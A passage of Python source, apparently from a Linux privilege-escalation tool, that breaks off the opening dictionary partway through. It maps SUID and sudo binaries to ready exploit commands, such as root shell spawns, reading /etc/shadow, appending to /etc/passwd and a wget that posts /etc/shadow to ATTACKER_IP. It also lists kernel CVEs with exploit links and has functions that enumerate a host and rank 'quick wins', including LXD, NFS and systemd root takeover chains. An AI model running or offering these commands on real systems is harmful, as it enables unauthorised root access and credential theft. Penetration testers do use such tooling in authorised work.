    "tee": {"category": "File write", "exploit_cmd": "echo data | tee -a /etc/passwd", "sudo_cmd": "echo data | sudo tee -a /etc/passwd"},
    "telnet": {"category": "Shell", "exploit_cmd": "telnet\n!/bin/sh -p", "sudo_cmd": "sudo telnet\n!/bin/sh"},
    "tftp": {"category": "File read", "exploit_cmd": "tftp 127.0.0.1\nget /etc/shadow", "sudo_cmd": "sudo tftp 127.0.0.1\nget /etc/shadow"},
    "time": {"category": "Shell", "exploit_cmd": "time /bin/sh -p", "sudo_cmd": "sudo time /bin/sh"},
    "timeout": {"category": "Shell", "exploit_cmd": "timeout 7d /bin/sh -p", "sudo_cmd": "sudo timeout 7d /bin/sh"},
    "tmux": {"category": "Shell", "exploit_cmd": "tmux", "sudo_cmd": "sudo tmux"},
    "top": {"category": "Shell", "exploit_cmd": "top\n!/bin/sh -p", "sudo_cmd": "sudo top\n!/bin/sh"},
    "troff": {"category": "Shell", "exploit_cmd": "troff\n.sy /bin/sh -p", "sudo_cmd": "sudo troff\n.sy /bin/sh"},
    "ul": {"category": "File read", "exploit_cmd": "ul /etc/shadow", "sudo_cmd": "sudo ul /etc/shadow"},
    "unexpand": {"category": "File read", "exploit_cmd": "unexpand -t 99 /etc/shadow", "sudo_cmd": "sudo unexpand -t 99 /etc/shadow"},
    "uniq": {"category": "File read", "exploit_cmd": "uniq /etc/shadow", "sudo_cmd": "sudo uniq /etc/shadow"},
    "unshare": {"category": "Shell", "exploit_cmd": "unshare /bin/sh -p", "sudo_cmd": "sudo unshare /bin/sh"},
    "unzip": {"category": "File read", "exploit_cmd": "unzip -p archive.zip", "sudo_cmd": "sudo unzip -p archive.zip"},
    "update-alternatives": {"category": "Shell", "exploit_cmd": "update-alternatives --force --install /bin/mount mount /bin/sh 1; mount", "sudo_cmd": "sudo update-alternatives --force --install /bin/mount mount /bin/sh 1; mount"},
    "uudecode": {"category": "File read", "exploit_cmd": "uudecode -o /dev/stdout /etc/shadow", "sudo_cmd": "sudo uudecode -o /dev/stdout /etc/shadow"},
    "uuencode": {"category": "File read", "exploit_cmd": "uuencode /etc/shadow /dev/stdout | uudecode", "sudo_cmd": "sudo uuencode /etc/shadow /dev/stdout | uudecode"},
    "valgrind": {"category": "Shell", "exploit_cmd": "valgrind /bin/sh -p", "sudo_cmd": "sudo valgrind /bin/sh"},
    "vi": {"category": "Shell", "exploit_cmd": "vi -c ':!/bin/sh -p'", "sudo_cmd": "sudo vi -c ':!/bin/sh'"},
    "vim": {"category": "Shell", "exploit_cmd": "vim -c ':!/bin/sh -p'", "sudo_cmd": "sudo vim -c ':!/bin/sh'"},
    "vimdiff": {"category": "Shell", "exploit_cmd": "vimdiff -c ':!/bin/sh -p'", "sudo_cmd": "sudo vimdiff -c ':!/bin/sh'"},
    "virsh": {"category": "Shell", "exploit_cmd": "virsh\n!/bin/sh -p", "sudo_cmd": "sudo virsh\n!/bin/sh"},
    "w3m": {"category": "Shell", "exploit_cmd": "w3m\n!/bin/sh -p", "sudo_cmd": "sudo w3m\n!/bin/sh"},
    "wall": {"category": "File read", "exploit_cmd": "wall --nobanner /etc/shadow", "sudo_cmd": "sudo wall --nobanner /etc/shadow"},
    "watch": {"category": "Shell", "exploit_cmd": "watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0'", "sudo_cmd": "sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'"},
    "wc": {"category": "File read", "exploit_cmd": "wc --files0-from /etc/shadow", "sudo_cmd": "sudo wc --files0-from /etc/shadow"},
    "wget": {"category": "File write", "exploit_cmd": "wget --post-file=/etc/shadow http://ATTACKER_IP:8000/", "sudo_cmd": "sudo wget --post-file=/etc/shadow http://ATTACKER_IP:8000/"},
    "whois": {"category": "File read", "exploit_cmd": "whois -h 127.0.0.1 -p 1 \"$(cat /etc/shadow)\"", "sudo_cmd": "sudo whois -h 127.0.0.1 -p 1 \"$(cat /etc/shadow)\""},
    "wish": {"category": "Shell", "exploit_cmd": "wish\nexec /bin/sh -p <@stdin >@stdout 2>@stderr", "sudo_cmd": "sudo wish\nexec /bin/sh <@stdin >@stdout 2>@stderr"},
    "xargs": {"category": "Shell", "exploit_cmd": "xargs -a /dev/null sh -p", "sudo_cmd": "sudo xargs -a /dev/null sh"},
    "xdotool": {"category": "Shell", "exploit_cmd": "xdotool exec --sync /bin/sh -p", "sudo_cmd": "sudo xdotool exec --sync /bin/sh"},
    "xmodmap": {"category": "File read", "exploit_cmd": "xmodmap -v /etc/shadow", "sudo_cmd": "sudo xmodmap -v /etc/shadow"},
    "xmore": {"category": "File read", "exploit_cmd": "xmore /etc/shadow", "sudo_cmd": "sudo xmore /etc/shadow"},
    "xz": {"category": "File read", "exploit_cmd": "xz -c /etc/shadow | xz -d", "sudo_cmd": "sudo xz -c /etc/shadow | xz -d"},
    "yarn": {"category": "Shell", "exploit_cmd": "yarn exec /bin/sh -p", "sudo_cmd": "sudo yarn exec /bin/sh"},
    "yum": {"category": "Shell", "exploit_cmd": "TF=$(mktemp -d); cat > $TF/x.conf << 'YEOF'\n[main]\nplugins=1\npluginpath=$TF\npluginconfpath=$TF\nYEOF\ncat > $TF/y.py << 'YEOF'\nimport os; os.execl('/bin/sh','sh','-p')\nYEOF\nyum -c $TF/x.conf", "sudo_cmd": "sudo yum\n!/bin/sh"},
    "zsh": {"category": "Shell", "exploit_cmd": "zsh", "sudo_cmd": "sudo zsh"},
    "zypper": {"category": "Shell", "exploit_cmd": "zypper x\n!/bin/sh -p", "sudo_cmd": "sudo zypper x\n!/bin/sh"},
    "zip": {"category": "Shell", "exploit_cmd": "TF=$(mktemp -u); zip $TF /etc/hosts -T -TT 'sh -p #'", "sudo_cmd": "TF=$(mktemp -u); sudo zip $TF /etc/hosts -T -TT 'sh #'"},
}

KERNEL_CVES = [
    {"cve": "CVE-2016-5195", "name": "DirtyCow", "versions": "< 4.8.3", "min": (2, 6), "max": (4, 8, 3), "reference": "https://github.com/dirtycow/dirtycow.github.io (EDB-40839)"},
    {"cve": "CVE-2021-3156", "name": "Baron Samedit (sudo)", "versions": "sudo < 1.9.5p2", "check": "sudo --version", "reference": "https://github.com/blasty/CVE-2021-3156 (EDB-49521)"},
    {"cve": "CVE-2021-4034", "name": "PwnKit (pkexec)", "versions": "polkit < 0.120", "check": "pkexec --version", "reference": "https://github.com/berdav/CVE-2021-4034 (EDB-50689)"},
    {"cve": "CVE-2022-0847", "name": "DirtyPipe", "versions": "5.8 - 5.16.11", "min": (5, 8), "max": (5, 16, 11), "reference": "https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit (EDB-50808)"},
    {"cve": "CVE-2022-2586", "name": "nf_tables", "versions": "5.x", "min": (5, 0), "max": (5, 19), "reference": "https://github.com/google/security-research/tree/master/pocs/linux/kernelctf/CVE-2022-2586"},
    {"cve": "CVE-2023-0386", "name": "OverlayFS", "versions": "5.11 - 6.2", "min": (5, 11), "max": (6, 2), "reference": "https://github.com/xkaneiki/CVE-2023-0386 (EDB-51497)"},
    {"cve": "CVE-2023-2640", "name": "GameOverlay", "versions": "Ubuntu specific", "check": "cat /etc/os-release", "reference": "https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629"},
    {"cve": "CVE-2023-32233", "name": "Netfilter nf_tables", "versions": "< 6.4", "min": (5, 0), "max": (6, 3, 99), "reference": "https://github.com/Liuk3r/CVE-2023-32233 (EDB-51578)"},
    {"cve": "CVE-2024-1086", "name": "nf_tables use-after-free", "versions": "5.14 - 6.6", "min": (5, 14), "max": (6, 6), "reference": "https://github.com/Notselwyn/CVE-2024-1086"},
]


def _run(cmd: str) -> str:
    try:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL, timeout=30).decode(errors="replace").strip()
    except Exception:
        return ""


def _parse_kernel() -> tuple:
    ver = _run("uname -r").split("-")[0]
    parts = ver.split(".")
    return tuple(int(p) for p in parts if p.isdigit())


def _analyze_suid(suid_list: list) -> list:
    exploitable = []
    for path in suid_list:
        name = os.path.basename(path)
        if name in GTFOBINS:
            info = GTFOBINS[name]
            exploitable.append({
                "path": path,
                "binary": name,
                "category": info["category"],
                "exploit_cmd": info["exploit_cmd"],
                "alert": f"[!] {path} -- SUID EXPLOIT: {info['exploit_cmd'].split(chr(10))[0]}",
            })
    return exploitable


def _parse_sudo_output(sudo_output: str) -> list:
    exploitable = []
    if not sudo_output:
        return exploitable
    for line in sudo_output.splitlines():
        line = line.strip()
        if not line or line.startswith("Matching") or line.startswith("User ") or line.startswith("Runas"):
            continue
        nopasswd = "NOPASSWD" in line
        match = re.findall(r'(/\S+)', line)
        for cmd_path in match:
            name = os.path.basename(cmd_path)
            if name in GTFOBINS:
                info = GTFOBINS[name]
                exploitable.append({
                    "command": cmd_path,
                    "binary": name,
                    "nopasswd": nopasswd,
                    "sudo_cmd": info["sudo_cmd"].split("\n")[0],
                    "category": info["category"],
                    "alert": f"[!] sudo {cmd_path} (NOPASSWD={nopasswd}) -- EXPLOIT: {info['sudo_cmd'].split(chr(10))[0]}",
                })
    return exploitable


def cmd_privesc_check() -> dict:
    results = {}

    suid = _run("find / -perm -4000 -type f 2>/dev/null")
    suid_list = [s.strip() for s in suid.splitlines() if s.strip()]
    exploitable_suids = _analyze_suid(suid_list)
    results["suid"] = {
        "all": suid_list,
        "exploitable": exploitable_suids,
        "alerts": [e["alert"] for e in exploitable_suids],
    }

    sgid = _run("find / -perm -2000 -type f 2>/dev/null")
    results["sgid"] = [s.strip() for s in sgid.splitlines() if s.strip()]

    sudo_raw = _run("sudo -l 2>/dev/null")
    exploitable_sudo = _parse_sudo_output(sudo_raw)
    results["sudo"] = {
        "raw": sudo_raw,
        "exploitable": exploitable_sudo,
        "alerts": [e["alert"] for e in exploitable_sudo],
    }

    caps = _run("getcap -r / 2>/dev/null")
    results["capabilities"] = [c.strip() for c in caps.splitlines() if c.strip()]

    crontab = _run("cat /etc/crontab 2>/dev/null")
    cron_d = _run("ls -la /etc/cron.d/ 2>/dev/null")
    user_cron = _run("crontab -l 2>/dev/null")
    results["cron"] = {"system": crontab, "cron_d": cron_d, "user": user_cron}

    writable_services = _run("find /etc/systemd /lib/systemd -writable -type f 2>/dev/null")
    results["writable_services"] = [s.strip() for s in writable_services.splitlines() if s.strip()]

    groups = _run("id")
    results["groups"] = groups
    results["docker"] = "docker" in groups.lower()
    results["lxd"] = "lxd" in groups.lower()

    nfs = _run("cat /etc/exports 2>/dev/null")
    results["nfs_no_root_squash"] = "no_root_squash" in nfs if nfs else False
    results["nfs_exports"] = nfs

    writable_path = []
    for d in os.getenv("PATH", "").split(":"):
        if d and os.path.isdir(d) and os.access(d, os.W_OK):
            writable_path.append(d)
    results["writable_path_dirs"] = writable_path

    localhost_services = _run("ss -tlnp 2>/dev/null | grep '127.0.0'")
    results["localhost_services"] = localhost_services

    writable_py = _run("python3 -c \"import sys; print('\\n'.join(sys.path))\" 2>/dev/null")
    writable_py_dirs = []
    for d in writable_py.splitlines():
        if d.strip() and os.path.isdir(d.strip()) and os.access(d.strip(), os.W_OK):
            writable_py_dirs.append(d.strip())
    results["writable_python_paths"] = writable_py_dirs

    timers = _run("systemctl list-timers --all --no-pager 2>/dev/null")
    results["timers"] = timers

    results["kernel"] = _run("uname -r")

    return results


def cmd_privesc_suggest() -> dict:
    check = cmd_privesc_check()
    suggestions = []

    if check.get("suid", {}).get("exploitable"):
        for entry in check["suid"]["exploitable"]:
            suggestions.append({
                "vector": f"SUID - {entry['binary']}",
                "path": entry["path"],
                "risk": "high",
                "category": entry["category"],
                "exploit_cmd": entry["exploit_cmd"],
                "info": entry["alert"],
            })

    if check.get("sudo", {}).get("exploitable"):
        for entry in check["sudo"]["exploitable"]:
            suggestions.append({
                "vector": f"Sudo - {entry['binary']}",
                "command": entry["command"],
                "risk": "critical" if entry["nopasswd"] else "high",
                "exploit_cmd": entry["sudo_cmd"],
                "info": entry["alert"],
            })

    if check.get("docker"):
        suggestions.append({
            "vector": "Docker Group",
            "risk": "critical",
            "exploit_cmd": GTFOBINS["docker"]["exploit_cmd"],
            "info": "[!] User in docker group -- docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
        })

    if check.get("lxd"):
        suggestions.append({
            "vector": "LXD Group",
            "risk": "critical",
            "exploit_cmd": "lxd init && lxc init ubuntu mycontainer -c security.privileged=true && lxc config device add mycontainer mydevice disk source=/ path=/mnt/root && lxc start mycontainer && lxc exec mycontainer -- /bin/sh",
            "info": "[!] User in lxd group -- mount host filesystem via privileged container",
        })

    if check.get("writable_python_paths"):
        suggestions.append({
            "vector": "Python Library Hijacking",
            "paths": check["writable_python_paths"],
            "risk": "medium",
            "info": "Writable Python paths -- check for scripts run as root that import from these",
        })

    if check.get("writable_services"):
        suggestions.append({
            "vector": "Writable Systemd Service",
            "paths": check["writable_services"],
            "risk": "high",
            "exploit_cmd": "Edit ExecStart in service file to run: /bin/bash -c 'cp /bin/sh /tmp/rootsh && chmod +s /tmp/rootsh' && systemctl daemon-reload && systemctl restart SERVICE",
            "info": "[!] Writable systemd service files -- modify ExecStart for code execution as root",
        })

    if check.get("nfs_no_root_squash"):
        suggestions.append({
            "vector": "NFS no_root_squash",
            "risk": "high",
            "exploit_cmd": "mount -t nfs TARGET:SHARE /mnt && cp /bin/sh /mnt/rootsh && chmod +s /mnt/rootsh && /mnt/rootsh -p",
            "info": "[!] NFS share with no_root_squash -- create SUID binary as root from attacker machine",
        })

    if check.get("writable_path_dirs"):
        suggestions.append({
            "vector": "PATH Hijacking",
            "paths": check["writable_path_dirs"],
            "risk": "medium",
            "info": "Writable PATH directories -- place malicious binary to hijack commands run by root",
        })

    return {"suggestions": suggestions, "count": len(suggestions)}


def cmd_vuln_scan() -> dict:
    kernel = _parse_kernel()
    if not kernel:
        return {"error": "Could not parse kernel version"}

    vulnerable = []
    for cve in KERNEL_CVES:
        if "min" in cve and "max" in cve:
            if cve["min"] <= kernel <= cve["max"]:
                vulnerable.append({
                    "cve": cve["cve"],
                    "name": cve["name"],
                    "affected": cve["versions"],
                    "kernel": ".".join(str(p) for p in kernel),
                    "reference": cve["reference"],
                })
        elif "check" in cve:
            output = _run(cve["check"])
            if output:
                vulnerable.append({
                    "cve": cve["cve"],
                    "name": cve["name"],
                    "affected": cve["versions"],
                    "check_output": output[:200],
                    "reference": cve["reference"],
                })

    return {"kernel": ".".join(str(p) for p in kernel), "vulnerabilities": vulnerable, "count": len(vulnerable)}


def cmd_full_analysis() -> dict:
    """Produces a structured summary: exploitable SUIDs, sudo commands, kernel CVEs, and quick wins."""
    check = cmd_privesc_check()
    vuln = cmd_vuln_scan()

    exploitable_suids = check.get("suid", {}).get("exploitable", [])
    exploitable_sudo = check.get("sudo", {}).get("exploitable", [])
    kernel_cves = vuln.get("vulnerabilities", [])

    quick_wins = []

    for entry in exploitable_sudo:
        if entry.get("nopasswd"):
            quick_wins.append({
                "method": f"sudo {entry['binary']} (NOPASSWD)",
                "exploit_cmd": entry["sudo_cmd"],
                "difficulty": "trivial",
                "priority": 1,
            })

    if check.get("docker"):
        quick_wins.append({
            "method": "Docker group membership",
            "exploit_cmd": GTFOBINS["docker"]["exploit_cmd"],
            "difficulty": "trivial",
            "priority": 1,
        })

    if check.get("lxd"):
        quick_wins.append({
            "method": "LXD group membership",
            "exploit_cmd": "lxd init && lxc launch ubuntu:latest priv -c security.privileged=true && lxc config device add priv host disk source=/ path=/mnt && lxc exec priv -- /bin/sh",
            "difficulty": "easy",
            "priority": 2,
        })

    shell_suids = [e for e in exploitable_suids if e["category"] == "Shell"]
    for entry in shell_suids:
        quick_wins.append({
            "method": f"SUID {entry['binary']}",
            "exploit_cmd": entry["exploit_cmd"],
            "difficulty": "easy",
            "priority": 2,
        })

    if check.get("writable_services"):
        quick_wins.append({
            "method": "Writable systemd service",
            "exploit_cmd": "Modify ExecStart, reload, restart",
            "difficulty": "easy",
            "priority": 2,
        })

    for cve_entry in kernel_cves:
        quick_wins.append({
            "method": f"Kernel {cve_entry['cve']} ({cve_entry['name']})",
            "exploit_cmd": f"See: {cve_entry['reference']}",
            "difficulty": "moderate",
            "priority": 3,
        })

    quick_wins.sort(key=lambda x: x["priority"])
    quick_wins = quick_wins[:3]

    return {
        "exploitable_suids": [{"path": e["path"], "exploit_cmd": e["exploit_cmd"]} for e in exploitable_suids],
        "exploitable_sudo": [{"command": e["command"], "exploit_cmd": e["sudo_cmd"]} for e in exploitable_sudo],
        "kernel_cves": [{"cve": c["cve"], "name": c["name"], "reference": c["reference"]} for c in kernel_cves],
        "quick_wins": quick_wins,
        "total_vectors": len(exploitable_suids) + len(exploitable_sudo) + len(kernel_cves),
    }


COMMANDS = {
    "privesc_check": {"handler": cmd_privesc_check, "description": "Comprehensive privilege escalation enumeration with exploit commands"},
    "privesc_suggest": {"handler": cmd_privesc_suggest, "description": "Analyze and suggest privesc paths with ready-to-use exploits"},
    "vuln_scan": {"handler": cmd_vuln_scan, "description": "Scan for known kernel/software CVEs with exploit references"},
    "full_analysis": {"handler": cmd_full_analysis, "description": "Full privesc analysis with structured summary and quick wins"},
}
